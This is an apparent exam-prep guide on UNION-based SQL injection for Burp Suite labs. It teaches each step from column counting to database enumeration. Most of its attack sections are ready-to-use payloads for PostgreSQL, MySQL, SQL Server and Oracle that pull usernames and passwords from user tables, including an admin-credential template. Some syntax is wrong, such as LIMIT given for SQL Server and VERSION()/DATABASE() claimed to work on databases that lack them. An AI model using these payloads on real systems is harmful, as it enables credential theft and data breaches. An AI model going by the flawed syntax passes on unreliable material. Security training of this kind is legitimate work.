# UNION-based SQL Injection - BSCP Exam Guide

## Core Concept

UNION-based SQL injection is the most direct and fastest way to extract data from a database. You combine the original vulnerable query with a UNION SELECT statement to return data from tables you specify.

**Why it's faster than other methods:**
- Returns results directly in the response
- No need for blind techniques or time delays
- Can extract large amounts of data quickly
- Straightforward once you understand the mechanics

**Prerequisites for UNION attack:**
1. You must know how many columns are in the original query
2. You must know which columns accept text data
3. The application must display the results to you

---

## Step 1: Find the Number of Columns

The original query selects a certain number of columns. Your UNION SELECT must have the same number of columns or the database will throw an error.

### Method 1: Using ORDER BY (Fastest Method)

The ORDER BY clause sorts results by a column number. If you specify a column that doesn't exist, you get an error.

```
Payload (try incrementing numbers):
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
' ORDER BY 5--
```

**Process:**
- Test ORDER BY 1, 2, 3, 4... until you get an error
- The last number that works = number of columns
- Example: ORDER BY 3 works, ORDER BY 4 gives error = 3 columns

**Important:** Comment out the rest of the query with -- or -- - to avoid syntax errors

### Method 2: Using UNION SELECT with NULL

Test with incrementing NULLs until you get no error:

```
Payload (keep adding NULLs):
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
```

**Process:**
- First successful payload without error = correct number of columns
- Example: UNION SELECT NULL,NULL,NULL-- works = 3 columns

**Advantage:** This also prepares you for the next step

---

## Step 2: Find Which Columns Contain Text Data

Databases often have different data types (numbers, text, dates). The UNION query needs to match data types. For extracting data, you want columns that accept text.

### Testing Data Types

Replace one NULL at a time with a text string:

```
Assume you found 3 columns. Test:
' UNION SELECT 'test',NULL,NULL--
' UNION SELECT NULL,'test',NULL--
' UNION SELECT NULL,NULL,'test'--
```

**Response:**
- If column accepts text: no error, 'test' appears in response
- If column is numeric: error appears (cannot convert text to number)

**Mark which columns work with text** - you'll use these for data extraction.

### Example Result

```
Column 1: number (doesn't accept 'test')
Column 2: text (accepts 'test') ✓
Column 3: text (accepts 'test') ✓

Result: Use columns 2 and 3 for extracting data
```

---

## Step 3: Identify the Database Type

Different databases have different functions and syntax. You need to know which one you're facing.

### Method: Query VERSION/DATABASE Information

```
For PostgreSQL, MySQL, SQL Server (use whichever text column you found):
' UNION SELECT NULL,VERSION(),NULL--
' UNION SELECT NULL,DATABASE(),NULL--

For Oracle (different approach - no information_schema):
' UNION SELECT NULL,BANNER,NULL FROM v$version--

For all databases (safe check):
' UNION SELECT NULL,'test',NULL--
```

### Identifying by Response

| Database | VERSION() Output | Other Clues |
|----------|-----------------|-----------|
| PostgreSQL | PostgreSQL 12.4 | Uses UNION, LIMIT, substring() |
| MySQL | 5.7.30, 8.0.20 | Uses UNION, LIMIT, SUBSTRING() |
| SQL Server | Microsoft SQL Server 2019 | Uses UNION, TOP, SUBSTRING() |
| Oracle | Oracle Database 19c | Uses UNION, ROWNUM, SUBSTR() |

**Note:** In early testing, if UNION SELECT NULL doesn't work, it might be Oracle (try different syntax)

---

## Step 4: Retrieve Database Information

### Finding Table Names (PostgreSQL/MySQL)

```
Payload (adjust column number based on your text columns):
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--

Better formatted:
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables LIMIT 5--
```

**Result:** You'll see all table names like:
- users
- products
- orders
- admins
- etc.

### Finding Column Names (PostgreSQL/MySQL)

Once you find a table name (e.g., 'users'), find its columns:

```
Payload (replace 'users' with actual table name):
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Result:** You'll see all columns like:
- username
- password
- email
- id
- etc.

### Oracle Database Alternative

Oracle doesn't have information_schema. Use data dictionary tables instead:

```
Find table names:
' UNION SELECT NULL,table_name,NULL FROM user_tables--

Find column names:
' UNION SELECT NULL,column_name,NULL FROM user_tab_columns WHERE table_name='USERS'--

Note: Oracle is case-sensitive. Table names might need to be uppercase.
```

---

## Step 5: Extract the Data

Now that you know table names and column names, extract the actual data.

### Simple Extraction

If you have 3 columns and columns 2 and 3 accept text:

```
Payload:
' UNION SELECT NULL,username,password FROM users--
```

**Result appears in the response showing username and password pairs**

### Combining Multiple Columns

Sometimes you want multiple values in one column (especially if you only have one text column):

```
For PostgreSQL:
' UNION SELECT NULL,username||'='||password,NULL FROM users--

For MySQL:
' UNION SELECT NULL,CONCAT(username,'=',password),NULL FROM users--

For SQL Server:
' UNION SELECT NULL,username+':'+password,NULL FROM users--

For Oracle:
' UNION SELECT NULL,username||':'||password,NULL FROM users--
```

**Result:** 
```
admin=password123
user=userpass456
guest=guestpass789
```

### Extracting from Specific Rows

If you want to limit results:

```
PostgreSQL/MySQL:
' UNION SELECT NULL,username,password FROM users LIMIT 5--

SQL Server:
' UNION SELECT NULL,username,password FROM users LIMIT 5--

Oracle:
' UNION SELECT NULL,username,password FROM users WHERE ROWNUM<=5--
```

---

## Complete Step-by-Step Lab Example

### Scenario: Vulnerable login form with search parameter

Original query: `SELECT id, name FROM products WHERE name LIKE '%searchterm%'`

### Step 1: Find Columns
```
Test: search=test' ORDER BY 1--
Result: Works

Test: search=test' ORDER BY 2--
Result: Works

Test: search=test' ORDER BY 3--
Result: Error

Conclusion: 2 columns
```

### Step 2: Find Text Columns
```
Test: search=' UNION SELECT NULL,NULL--
Result: Works (no error, means 2 columns confirmed)

Test: search=' UNION SELECT 'test',NULL--
Result: 'test' appears in response (column 1 = text)

Test: search=' UNION SELECT NULL,'test'--
Result: 'test' appears in response (column 2 = text)

Conclusion: Both columns accept text
```

### Step 3: Find Database Type
```
Test: search=' UNION SELECT VERSION(),NULL--
Result: PostgreSQL 12.4

Conclusion: PostgreSQL database
```

### Step 4: Find Tables
```
Test: search=' UNION SELECT table_name,NULL FROM information_schema.tables--
Result: Shows all tables including 'users'

Conclusion: users table exists
```

### Step 5: Find Columns in Users Table
```
Test: search=' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
Result: Shows columns: id, username, password, email

Conclusion: password column exists
```

### Step 6: Extract User Credentials
```
Test: search=' UNION SELECT username,password FROM users--
Result: 
admin,password123
user1,mypass456
guest,guest789

Conclusion: Got all credentials!
```

---

## Database-Specific Complete Payloads

### PostgreSQL - Full Attack Path

```
Find columns:
' ORDER BY 1,2,3--

Find text columns:
' UNION SELECT 'test','test'--

Database version:
' UNION SELECT VERSION(),NULL--

List tables:
' UNION SELECT table_name,NULL FROM information_schema.tables--

List columns in 'users':
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

Extract usernames and passwords:
' UNION SELECT username,password FROM users--

Extract with concatenation:
' UNION SELECT username||':'||password,NULL FROM users--
```

### MySQL - Full Attack Path

```
Find columns:
' ORDER BY 1,2--

Find text columns:
' UNION SELECT 'test','test'--

Database version:
' UNION SELECT VERSION(),NULL--

List tables:
' UNION SELECT table_name,NULL FROM information_schema.tables--

List columns in 'users':
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

Extract usernames and passwords:
' UNION SELECT username,password FROM users--

Extract with concatenation:
' UNION SELECT CONCAT(username,':',password),NULL FROM users--
```

### SQL Server - Full Attack Path

```
Find columns:
' ORDER BY 1,2--

Find text columns:
' UNION SELECT 'test','test'--

Database version:
' UNION SELECT @@version,NULL--

List tables:
' UNION SELECT table_name,NULL FROM information_schema.tables--

List columns in 'users':
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

Extract usernames and passwords:
' UNION SELECT username,password FROM users--

Extract with concatenation:
' UNION SELECT username+':'+password,NULL FROM users--
```

### Oracle - Full Attack Path

```
Find columns:
' ORDER BY 1,2--

Find text columns:
' UNION SELECT 'test','test' FROM dual--

Database version:
' UNION SELECT BANNER,NULL FROM v$version--

List tables:
' UNION SELECT table_name,NULL FROM user_tables--

List columns in 'USERS':
' UNION SELECT column_name,NULL FROM user_tab_columns WHERE table_name='USERS'--

Extract usernames and passwords:
' UNION SELECT username,password FROM users--

Extract with concatenation:
' UNION SELECT username||':'||password,NULL FROM users--
```

---

## Quick Reference Cheatsheet

### Attack Progression

```
Step 1: ORDER BY 1,2,3... until error → find column count
Step 2: UNION SELECT 'test','test'... → find text columns
Step 3: UNION SELECT VERSION(),NULL → identify database
Step 4: UNION SELECT table_name,NULL FROM information_schema.tables → find tables
Step 5: UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='target' → find columns
Step 6: UNION SELECT col1,col2 FROM target_table → extract data
```

### String Concatenation by Database

| Database | Syntax | Example |
|----------|--------|---------|
| PostgreSQL | \|\| | username\|\|':'\|\|password |
| MySQL | CONCAT() | CONCAT(username,':',password) |
| SQL Server | + | username+':'+password |
| Oracle | \|\| | username\|\|':'\|\|password |

### Substring/Partial Data by Database

| Database | Function | Syntax |
|----------|----------|--------|
| PostgreSQL | substring() | substring(password,1,5) |
| MySQL | SUBSTRING() | SUBSTRING(password,1,5) |
| SQL Server | SUBSTRING() | SUBSTRING(password,1,5) |
| Oracle | SUBSTR() | SUBSTR(password,1,5) |

### Limiting Results by Database

| Database | Syntax |
|----------|--------|
| PostgreSQL | LIMIT 10 |
| MySQL | LIMIT 10 |
| SQL Server | TOP 10 (before column list) |
| Oracle | WHERE ROWNUM<=10 |

---

## Critical Payload Templates

### Universal Column Discovery
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
' ORDER BY 5--
```

### Universal Text Column Discovery
```
' UNION SELECT 'test','test'--
' UNION SELECT 'test',NULL--
' UNION SELECT NULL,'test'--
```

### PostgreSQL/MySQL Version Check
```
' UNION SELECT VERSION(),NULL--
' UNION SELECT DATABASE(),NULL--
```

### SQL Server Version Check
```
' UNION SELECT @@version,NULL--
' UNION SELECT DB_NAME(),NULL--
```

### Oracle Version Check
```
' UNION SELECT BANNER,NULL FROM v$version--
' UNION SELECT name,NULL FROM v$database--
```

### Extract Admin Credentials
```
PostgreSQL/MySQL/SQL Server:
' UNION SELECT username,password FROM users WHERE username='admin'--

Oracle:
' UNION SELECT username,password FROM users WHERE username='admin'--
```

---

## Common Issues and Troubleshooting

### Issue: No UNION results appearing in response

**Possible causes:**
1. Wrong number of columns in UNION SELECT
2. The application filters out error messages but doesn't display UNION results
3. NULL values are being displayed as empty instead of the data

**Solution:**
- Verify exact column count with ORDER BY
- Try replacing NULL with actual data: `' UNION SELECT 1,2,3--`
- Check if results appear elsewhere (page comments, developer console)

### Issue: "Subquery returned more than 1 value"

**Cause:** Your WHERE clause in the UNION query is returning multiple rows

**Solution:**
- Add LIMIT 1 or ROWNUM<=1 to your query
- Example: `' UNION SELECT username,password FROM users LIMIT 1--`

### Issue: Data type mismatch error

**Cause:** You're trying to display non-text data in a text column, or vice versa

**Solution:**
- Test columns individually to find which accept text
- Use CAST to convert data types if needed
- Example: `' UNION SELECT CAST(id AS VARCHAR),username FROM users--`

### Issue: Can't find table in information_schema

**Possible causes:**
1. Wrong database type (information_schema only in MySQL/PostgreSQL)
2. Table name has special characters or is case-sensitive
3. You don't have permissions to view that table

**Solution:**
- Verify database type first
- Try uppercase table names (especially Oracle)
- Try different common table names (users, admin, accounts, credentials)

### Issue: information_schema.tables returns nothing

**Possible causes:**
1. This is Oracle (no information_schema)
2. Table is in a different schema

**Solution for Oracle:**
```
Use these instead:
' UNION SELECT table_name,NULL FROM user_tables--
' UNION SELECT table_name,NULL FROM all_tables--
```

### Issue: Getting error about FROM clause

**Cause:** Probably Oracle - Oracle requires FROM clause in SELECT

**Solution:**
- Add FROM dual to every SELECT
- Example: `' UNION SELECT 'test','test' FROM dual--`

---

## SQL Server Specific Tips

SQL Server has slightly different syntax:

```
Use TOP instead of LIMIT:
' UNION SELECT TOP 5 username,password FROM users--

Column ordering matters with TOP - put it right after SELECT

Use brackets for table/column names with spaces:
' UNION SELECT [User Name],[Password] FROM [Users]--
```

---

## Extraction Efficiency Tips

### Extract Multiple Columns at Once

Instead of querying each column separately:

```
Good - gets 3 pieces of info in one query:
' UNION SELECT username,password,email FROM users--

Bad - requires 3 separate queries:
' UNION SELECT username,NULL FROM users--
' UNION SELECT password,NULL FROM users--
' UNION SELECT email,NULL FROM users--
```

### Use Concatenation for Single-Column Displays

If you only have one text column working:

```
PostgreSQL:
' UNION SELECT username||'='||password||' email:'||email FROM users--

Result shows: admin=pass123 email:admin@site.com
```

### Combine with ORDER BY for Organization

```
' UNION SELECT username,password FROM users ORDER BY username--

Results are alphabetically sorted by username
```

---

## Burp Suite Integration

### Setting up for UNION Attacks

1. Send request to Repeater (right-click → Send to Repeater)
2. Modify search parameter with UNION payloads
3. Send and check response in the Response tab
4. Use Intruder only if you need to brute force column count (rare)

### Quick Testing Workflow

```
In Repeater:
1. Try: ' ORDER BY 1-- (look for normal results)
2. Try: ' ORDER BY 10-- (look for error)
3. Binary search column count: ' ORDER BY 5--
4. Verify with: ' UNION SELECT NULL,NULL,NULL,NULL,NULL--
5. Test text columns: Replace NULL one by one with 'test'
6. Get version: ' UNION SELECT VERSION(),NULL,NULL,NULL,NULL--
```

---

## Final Checklist Before Lab Completion

```
[ ] Confirmed vulnerable to SQL injection
[ ] Found exact number of columns (ORDER BY worked)
[ ] Identified which columns accept text
[ ] Determined database type (VERSION check)
[ ] Located target table in information_schema/user_tables
[ ] Found target columns in that table
[ ] Extracted all required data successfully
[ ] Verified data is readable (not encrypted)
[ ] Successfully logged in with extracted credentials
[ ] Lab marked as complete
```

---

## Time-Saving Strategy

UNION attacks are fastest when you work methodically:

1. **Column count: 1 minute** - Quick ORDER BY test
2. **Text columns: 1 minute** - Test replacing NULLs
3. **Database ID: 30 seconds** - VERSION() query
4. **Table discovery: 2 minutes** - Query information_schema
5. **Column discovery: 2 minutes** - Find target columns
6. **Data extraction: 1 minute** - Simple SELECT query

**Total: ~7 minutes for complete exploitation**

Compared to blind SQL injection which can take 20-30 minutes, UNION attacks are much faster when available.

---

## Remember

UNION-based SQL injection is the "fast track" for data extraction. If you can get it working, always choose UNION over blind techniques. The key is accurately finding the column count first - everything else flows from that single piece of information.

Practice identifying column counts quickly, and these labs become trivial.